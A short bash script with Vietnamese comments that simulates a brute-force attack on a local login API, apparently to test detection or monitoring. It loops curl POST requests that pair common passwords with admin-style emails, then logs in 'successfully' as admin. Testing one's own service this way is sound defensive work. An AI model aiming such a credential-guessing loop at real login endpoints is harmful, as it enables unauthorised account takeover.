#!/bin/bash

# Script mô phỏng tấn công brute force vào API đăng nhập
echo "Bắt đầu mô phỏng tấn công brute force vào API đăng nhập..."

# Danh sách password để thử
PASSWORDS=("password123" "admin123" "123456" "qwerty" "letmein" "welcome" "password" "admin")

# Danh sách email để thử
EMAILS=("admin@example.com" "administrator@security.local" "root@local" "admin@security.local")

# Địa chỉ API
API_URL="http://localhost:5001/api/auth/login"

# Số lần thử
NUM_ATTEMPTS=15

for ((i=1; i<=NUM_ATTEMPTS; i++)); do
  # Chọn ngẫu nhiên email và password
  EMAIL=${EMAILS[$((RANDOM % ${#EMAILS[@]}))]}
  PASSWORD=${PASSWORDS[$((RANDOM % ${#PASSWORDS[@]}))]}
  
  echo "Thử đăng nhập lần $i với $EMAIL:$PASSWORD"
  
  # Gửi yêu cầu đăng nhập
  curl -s -X POST "$API_URL" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$EMAIL\", \"password\":\"$PASSWORD\"}" > /dev/null
  
  # Nghỉ một chút giữa các lần thử
  sleep 1
done

# Thử đăng nhập thành công với admin@security.local:admin123
echo "Thử đăng nhập thành công với tài khoản admin..."
curl -s -X POST "$API_URL" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"admin@security.local\", \"password\":\"admin123\"}"

echo -e "\nHoàn thành mô phỏng tấn công brute force!"
